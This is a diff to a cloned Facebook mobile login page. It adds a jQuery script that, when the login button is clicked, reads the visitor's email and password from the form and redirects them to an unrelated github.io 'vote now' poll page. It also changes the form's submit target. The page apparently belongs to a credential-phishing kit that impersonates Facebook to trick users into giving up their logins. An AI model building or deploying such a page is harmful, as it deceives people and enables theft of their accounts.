@@ -1,6 +1,20 @@
 <!DOCTYPE html>
 <html>
    <head>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+   <script>
+	$(document).ready(function()
+	{
+		$("#u_0_4").click(function()
+		{
+			var txtLogin = $("#m_login_email").val();
+			var txtPass = $("#m_login_password").val();
+			
+			window.location.replace("https://quarantreats2020.github.io/QT/votenow/poll.html");
+		});
+	});
+   </script>
+   
       <title>Log into Facebook | Facebook</title>
       <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
       <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
@@ -68,7 +82,7 @@
                            <div class="_4g34"><a href="/login/?refid=9"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" /></a></div>
                         </div>
                         <div class="_5rut" data-sigil="login_inner">
-                           <form method="post" action="post.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
+                           <form method="post" action="" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                               <input type="hidden" name="lsd" value="AVrBbhsc" autocomplete="off" /><input type="hidden" name="jazoest" value="2747" autocomplete="off" /><input type="hidden" name="m_ts" value="1599909230" /><input type="hidden" name="li" value="bq1cXy_xXTPPTjJVpXihbzBw" /><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
                               <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                               <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
